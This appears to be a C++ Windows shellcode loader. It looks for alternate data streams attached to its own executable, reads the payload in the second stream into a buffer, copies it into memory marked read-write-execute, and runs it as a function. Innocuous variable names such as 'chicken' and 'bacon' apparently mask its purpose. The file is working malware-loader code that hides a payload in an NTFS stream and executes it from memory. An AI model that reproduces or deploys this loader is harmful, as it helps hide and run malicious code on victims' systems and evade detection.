#include <iostream>
#include <sstream>
#include <windows.h>
#include "utilities.h"
#include "ADS.h"

void basic_ldr(size_t chickenSize) {
    void* exec = VirtualAlloc(0, chickenSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (!exec) {
        std::cerr << "Memory allocation failed" << std::endl;
        return;
    }

    memcpy(exec, bacon, chickenSize);

    ((void(*)())exec)();
}

int main(int argc, char** argv) {
    Log(L"Detecting alternate data streams.");
    auto streamNames = getAlternateDataStreamNames(ConvertToWString(argv[0]));
    if (streamNames.empty()) {
        Log(L"No alternate data streams found.");
        return 1;
    }
    Log(L"Alternate data streams found.");

    if (streamNames.size() < 2) {
        Log(L"Not enough streams to execute payload.");
        return 1;
    }

    streamSize = getDataFromTheStream(ConvertToWString(argv[0]), streamNames[1]);
    if (streamSize == 0) {
        return 1;
    }

    basic_ldr(streamSize);

    delete[] bacon; // Free the allocated memory

    return 0;
}
